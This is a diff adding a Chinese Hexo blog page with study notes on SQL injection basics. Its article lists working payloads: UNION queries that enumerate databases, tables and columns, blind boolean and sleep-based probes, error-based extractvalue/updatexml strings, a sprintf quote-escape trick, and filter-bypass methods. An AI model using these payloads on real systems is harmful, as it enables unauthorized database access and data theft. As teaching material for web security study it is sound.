@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SQL注入基础 | Lcdm123</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="注入类型SQL注入有许多类型：按参数分类有：数字型注入与字符型注入；    按返回结果分类有： 报错注入 盲注入； 注入操作 判断数字型注入与字符型注入id&#x3D;1         正确id&#x3D;1’        错误id&#x3D;1 and 1&#x3D;1 正确id&#x3D;1 and 1&#x3D;2 错误则根据上述情况一般可以确定为数字型注入；字符型注入要注意闭合的符号，可能有单引号，双引号，括号等；形式多样注意巧妙辨别； 注入的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入基础">
+<meta property="og:url" content="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="注入类型SQL注入有许多类型：按参数分类有：数字型注入与字符型注入；    按返回结果分类有： 报错注入 盲注入； 注入操作 判断数字型注入与字符型注入id&#x3D;1         正确id&#x3D;1’        错误id&#x3D;1 and 1&#x3D;1 正确id&#x3D;1 and 1&#x3D;2 错误则根据上述情况一般可以确定为数字型注入；字符型注入要注意闭合的符号，可能有单引号，双引号，括号等；形式多样注意巧妙辨别； 注入的">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-10-14T04:47:08.000Z">
+<meta property="article:modified_time" content="2020-10-14T04:47:28.906Z">
+<meta property="article:author" content="海马少年">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://i.loli.net/2020/10/11/GBtfn9VIm2qKkz3.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/lcdm123" title="github">github</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://i.loli.net/2020/10/11/GBtfn9VIm2qKkz3.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/lcdm123" title="github">github</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-SQL注入基础" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" class="article-date">
+  	<time datetime="2020-10-14T04:47:08.000Z" itemprop="datePublished">2020-10-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQL注入基础
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><p>SQL注入有许多类型：按参数分类有：数字型注入与字符型注入；<br>    按返回结果分类有： 报错注入 盲注入；</p>
+<h4 id="注入操作"><a href="#注入操作" class="headerlink" title="注入操作"></a>注入操作</h4><ol>
+<li>判断数字型注入与字符型注入<br>id=1         正确<br>id=1’        错误<br>id=1 and 1=1 正确<br>id=1 and 1=2 错误<br>则根据上述情况一般可以确定为数字型注入；<br>字符型注入要注意闭合的符号，可能有单引号，双引号，括号等；形式多样注意巧妙辨别；</li>
+<li>注入的一般语句<br>使用 order by 确定字段数 并判断回显位置；<br>查库名 id= -1 union select schema_name from information_schema.schemata –+<br>查某库所有表名 id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=”库名” –+<br>查表中所有字段 id= -1 union select group_concat(column_name) from information_schema.columns where table_schema=”库名” and table_name=”表名”  –+<br>查字段的值 id=-1 union select 字段名 from 表名 –+</li>
+<li>盲注入<br>盲注入分为：基于时间盲注入与基于布尔的盲注入；<br>相关函数：sleep() 延时返回’<pre><code>       substr(string,n,m)从字符串的第n个位置开始截取m个字符；
+       if(expr1,expr2,expr3) 当expr1正确时执行expr2,否则执行expr3;</code></pre>
+基于布尔的盲注入：当页面子只返回查询的正确与错误，而不反回具体内容时适用；<pre><code>    注入语句：id=1 and length(database())&gt;n --+ 判断数据库的名字长度；
+             id=1 and substr(database(),1,1)&gt;&#39;字符&#39; --+ 判断数据库名字；
+             id=1 and substr((select table_name from information_schema.tables where table_schema=datbase() limit 0,1), 1, 1 )=&#39;字符&#39; --+ 判断表名；
+             id=1 and substr((select column_name from information_schema.columns where table_schema=datbase() and table_name=&#39;表名&#39; limit 0,1), 1, 1 )=&#39;字符&#39; --+ 判断字段；
+             id=1 and substr((select 字段 from 表名 limit 0,1))=&#39;&#39; --+ 判断值；</code></pre>
+延时注入：适用与页面回显不变时；<pre><code>   注入语句：id=1 and if((database()=&#39;&#39;),sleep(3),null);
+             其余类似只需要改变判断条件即可；</code></pre>
+</li>
+<li>报错注入<br>利用数据库的报错信息来获取我们需要的东西<br>count() 统计select 返回的记录条数；<br>concat() 字符串连接功能；<br>floor() 向下取整<br>rand() 生成0~1 之间的随机浮点数；<br>group by 根据一个或多个列对结果进行排序；<br>floor(rand(0)<em>2)产生随机数0或1；<br>updatexml() mysql 5.1.5<br>extractvalue() mysql 5.1.5<br>a.  id=1 and select count(</em>), concat( (…) , 0x7e , floor(rand(0)<em>2))x from information_schema.tables group by x –+<br>b.  id=1 and select 1 from (select counut(</em>), concat( (….) , 0x7e , floor(rand(0)*2) )x from information_schema.tables group by x )a –+<br>c.  id=1 and extractvalue(1, concat(0x7e,(….),0x7e)) –+ 报错信息最多32位；<br>d.  id=1 and updatexml(1,concat(0x7e,(…),0x7e ),1) –+ 报错信息最多32位；</li>
+<li>格式化注入<br>sprintf()将格式化字符串写入变量中；<br>sprintf(format,arg1,arg2,arg++) arg1,arg2,arg++会被插入到主字符串中的%处，该函数逐步执行，若%多于arg参数，则必须使用占位符，占位符位于%后且由数字与$组成；<br>该函数的php源码中只对15种类型的字符做了匹配，其他字符直接break跳出，这样它就可以吃掉转义字符,若%后有\，那么PHP会把\当作一个格式化字符的类型而吃掉,最后%\或%1$\被替换为空；<br>addslashes() 在单引号，双引号，反斜杠，NULL 前加反斜杠进行转义；<br>输入 %1$’ 变成 %1$&#39; 单引号成功逃逸；</li>
+</ol>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ol>
+<li>双写绕过；oorr  ununionion seselectlect ……</li>
+<li>大小写绕过</li>
+<li>编码绕过:URL全编码（由于服务器会对URL编码进行一次解码，所以需要编码两次）；</li>
+<li>内联注释绕过</li>
+</ol>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/10/13/python%E7%9A%84requests%E5%BA%93%E5%BA%94%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">python的requests库应用</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="SQL注入基础" data-title="SQL注入基础" data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"  data-images="https://i.loli.net/2020/10/11/GBtfn9VIm2qKkz3.jpg" data-content="SQL注入基础">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2020 海马少年
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
